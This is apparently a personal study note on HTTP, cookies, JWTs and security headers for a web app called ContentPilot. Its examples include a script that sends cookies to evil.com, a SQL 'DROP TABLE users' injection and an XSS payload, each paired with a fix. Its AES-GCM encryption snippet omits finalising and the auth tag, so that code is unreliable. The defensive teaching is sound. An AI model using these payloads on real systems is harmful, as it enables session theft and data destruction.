---
tags: [concept, security, http]
created: 2026-03-27
---
# HTTP Request and Response

## What is it?

HTTP (HyperText Transfer Protocol) is the communication protocol browsers and servers use to talk to each other over the internet. It is a stateless, text-based request-response protocol — meaning every request is independent, the server doesn't remember previous requests unless you explicitly pass state (via cookies or tokens).

HTTPS is HTTP + TLS encryption. Every byte travelling between your browser and the server is encrypted so no one in the middle can read or tamper with it.

Think of HTTP like a letter:

- Envelope = headers (who it's from, what's inside)
- Letter = body (the actual content)
- Return address = status code (did it arrive? was it rejected?)

---

## Why does it matter?

Every single thing ContentPilot does is HTTP under the hood:

- Browser loads dashboard → HTTP GET
- Generate caption → HTTP POST to Claude API
- Upload video → HTTP POST to YouTube API
- Schedule post → HTTP POST to Supabase
- Vercel Cron fires → HTTP GET to /api/schedule

If you understand HTTP deeply you can debug anything.

---

## How it works

### Request structure

```
POST /api/generate HTTP/1.1          ← request line (method + path + version)
Host: contentpilot.com               ← headers start here
Content-Type: application/json
Authorization: Bearer eyJhbGc...     ← JWT token
Cookie: session_id=abc123            ← session cookie

{                                    ← body (blank line separates headers/body)
  "trip": "Coorg ride, golden hour",
  "duration": "45 seconds"
}
```

### Response structure

```
HTTP/1.1 200 OK                      ← status line
Content-Type: application/json
Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict
X-Content-Type-Options: nosniff      ← security headers
X-Frame-Options: DENY
Strict-Transport-Security: max-age=31536000

{                                    ← body
  "caption": "Just another sunset on the 390...",
  "hashtags": ["#ktm390", "#karnataka"]
}
```

---
![[http_request_response.svg|697]]
## HTTP Methods in ContentPilot

|Method|Route|What it does|
|---|---|---|
|GET|/dashboard|fetch posts and queue|
|POST|/api/generate|send trip, get caption|
|POST|/api/publish/youtube|upload video|
|POST|/api/publish/instagram|post reel|
|PUT|/api/posts/:id|update scheduled post|
|DELETE|/api/posts/:id|cancel a post|

---

## Status codes used in ContentPilot

|Code|Meaning|When ContentPilot uses it|
|---|---|---|
|200|OK|caption generated|
|201|Created|post scheduled|
|204|No content|post deleted|
|400|Bad request|missing trip details|
|401|Unauthorized|no token / expired token|
|403|Forbidden|token valid but no permission|
|404|Not found|post doesn't exist|
|429|Too many requests|rate limit hit|
|500|Server error|Claude API or Supabase failed|
|503|Service unavailable|YouTube API down|

---

## Cookies — what they are and how they work

A cookie is a small piece of data the server sends to the browser, which the browser stores and sends back automatically on every future request to that domain.

```
Server → browser:
Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict

Browser → server (every request after):
Cookie: session_id=abc123
```

### Cookie attributes — security critical

| Attribute       | What it does                        | Why it matters                   |
| --------------- | ----------------------------------- | -------------------------------- |
| HttpOnly        | JS cannot read this cookie          | prevents XSS stealing the cookie |
| Secure          | only sent over HTTPS                | prevents sending over plain HTTP |
| SameSite=Strict | only sent on same-origin requests   | prevents CSRF attacks            |
| SameSite=Lax    | sent on same-origin + top-level nav | good balance for most apps       |
| Expires/MaxAge  | when cookie expires                 | session vs persistent cookies    |

### Cookie hijacking

If a cookie doesn't have HttpOnly, malicious JS can steal it:

```js
// Attacker injects this script via XSS
document.location = 'https://evil.com/steal?c=' + document.cookie
```

**Fix**: Always set HttpOnly on session cookies. Never store sensitive data in cookies readable by JS.

---

## JWT — JSON Web Token

JWT is an alternative to cookies for auth. Instead of a session ID, the server issues a signed token containing the user's identity.

```
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzIn0.abc123
       ↑ header              ↑ payload           ↑ signature
```

Decoded payload:

```json
{
  "user_id": "123",
  "email": "uday@contentpilot.com",
  "exp": 1711584000
}
```

### JWT hijacking

If someone steals your JWT they can impersonate you until it expires.

**Attack vectors:**

```js
// 1. XSS — if JWT stored in localStorage
const token = localStorage.getItem('token') // attacker reads this

// 2. Man in the middle — if sent over HTTP (not HTTPS)
// attacker intercepts the request and reads the Authorization header

// 3. Weak secret — brute force the signature
// if your JWT_SECRET is "password123" attacker can forge tokens
```

**Fixes for ContentPilot:**

```js
// Store JWT in HttpOnly cookie, not localStorage
// Never in localStorage — XSS can steal it

// Use strong secret
JWT_SECRET=crypto.randomBytes(64).toString('hex') // in .env

// Short expiry + refresh tokens
{ exp: Date.now() + 15 * 60 * 1000 } // 15 min access token

// Verify on every request
import { jwtVerify } from 'jose'
const { payload } = await jwtVerify(token, secret)
```

---

## Security headers — add these to ContentPilot

In `next.config.js`:

```js
const securityHeaders = [
  {
    key: 'X-DNS-Prefetch-Control',
    value: 'on'
  },
  {
    key: 'Strict-Transport-Security',
    value: 'max-age=63072000; includeSubDomains; preload'
    // forces HTTPS for 2 years
  },
  {
    key: 'X-Frame-Options',
    value: 'DENY'
    // prevents clickjacking — your page can't be iframed
  },
  {
    key: 'X-Content-Type-Options',
    value: 'nosniff'
    // prevents MIME type sniffing attacks
  },
  {
    key: 'Referrer-Policy',
    value: 'origin-when-cross-origin'
  },
  {
    key: 'Content-Security-Policy',
    value: "default-src 'self'; script-src 'self'; img-src 'self' res.cloudinary.com"
    // only allow scripts/images from your domain + Cloudinary
  },
  {
    key: 'Permissions-Policy',
    value: 'camera=(), microphone=(), geolocation=()'
    // block browser APIs you don't need
  }
]
```

---

## Encrypting requests and responses

HTTPS already encrypts everything in transit (TLS). But you should also encrypt sensitive data at rest and in your API payloads.

### What HTTPS protects

```
Browser ←—— encrypted ——→ Vercel edge ←—— encrypted ——→ origin
```

No one between browser and server can read the data.

### What HTTPS does NOT protect

- Data stored in your database (encrypt at rest)
- Logs (don't log sensitive fields)
- Environment variables (use Vercel secrets, never commit .env)

### Encrypting sensitive fields in Supabase

```js
import { createCipheriv, randomBytes } from 'crypto'

// Encrypt before storing
function encrypt(text) {
  const iv = randomBytes(16)
  const cipher = createCipheriv('aes-256-gcm',
    Buffer.from(process.env.ENCRYPTION_KEY, 'hex'), iv)
  return iv.toString('hex') + ':' + cipher.update(text, 'utf8', 'hex')
}

// Store encrypted YouTube/Instagram tokens in DB
await prisma.user.update({
  data: { youtube_token: encrypt(accessToken) }
})
```

---

## API payload security — exploiting payloads

### SQL injection via API body

```js
// Attacker sends:
{ "username": "admin'; DROP TABLE users; --" }

// Fix: use Prisma — it parameterizes queries automatically
await prisma.user.findFirst({ where: { username } }) // safe
```

### XSS via API response

```js
// Attacker stores this in DB via your API:
{ "caption": "<script>steal(document.cookie)</script>" }

// Fix: sanitize before rendering
import DOMPurify from 'dompurify'
const safe = DOMPurify.sanitize(caption)
```

### Mass assignment attack

```js
// Attacker sends extra fields:
{ "trip": "Coorg", "role": "admin", "user_id": "456" }

// Fix: whitelist only what you expect using Zod
const schema = z.object({
  trip: z.string().max(500),
  duration: z.string()
  // role and user_id are ignored — not in schema
})
```

---

## Applied to ContentPilot — security checklist

- [ ] All API routes validate input with Zod
- [ ] JWT stored in HttpOnly cookie not localStorage
- [ ] JWT secret is 64 random bytes from crypto
- [ ] Security headers added to next.config.js
- [ ] YouTube/Instagram tokens encrypted in DB
- [ ] All API responses sanitized before rendering
- [ ] Rate limiting on /api/generate (Claude API costs money)
- [ ] HTTPS enforced via HSTS header

---

## Trade-offs

|Approach|Pro|Con|
|---|---|---|
|JWT in cookie|XSS safe|CSRF risk (use SameSite)|
|JWT in localStorage|Easy to use|XSS can steal it|
|Session cookies|Simple, revocable|Needs session store (Redis)|
|Short-lived JWT + refresh|Best security|More complex implementation|

---

## Interview questions

**Q: What is the difference between HTTP and HTTPS?** A: HTTP sends data as plain text — anyone between client and server can read it. HTTPS wraps HTTP in TLS encryption so all data is encrypted in transit. ContentPilot uses HTTPS — enforced by Vercel and our HSTS header.

**Q: What is the difference between 401 and 403?** A: 401 means not authenticated — you haven't logged in or your token expired. 403 means authenticated but not authorized — you're logged in but don't have permission for this resource.

**Q: Where should you store a JWT — cookie or localStorage?** A: HttpOnly cookie. localStorage is accessible by JS — any XSS attack can steal it. HttpOnly cookie is invisible to JS, sent automatically by the browser, and safe from XSS.

**Q: What is cookie hijacking and how do you prevent it?** A: Attacker steals your session cookie via XSS and impersonates you. Prevent with: HttpOnly (JS can't read it), Secure (HTTPS only), SameSite=Strict (no cross-site requests).

**Q: How would you rate limit the /api/generate endpoint?** A: Use Vercel's built-in rate limiting or an upstash Redis rate limiter. Track requests per user per minute in Redis. Return 429 if limit exceeded. Important because Claude API costs money per call.

**Q: What is SQL injection and how does Prisma prevent it?** A: Attacker sends SQL code in API body hoping it gets executed. Prisma prevents it by using parameterized queries — user input is never concatenated into SQL strings directly.

**Q: What security headers should a production Next.js app have?** A: HSTS (force HTTPS), X-Frame-Options DENY (no clickjacking), X-Content-Type-Options nosniff, CSP (restrict script sources), Permissions-Policy (disable unused browser APIs).

---

Related: [[01 - Projects/ContentPilot/Architecture v1]] [[02 - System Design/Concepts/Client-Server Model]] [[02 - System Design/Concepts/DNS Resolution]] [[02 - System Design/Concepts/CDN and Edge Networks]]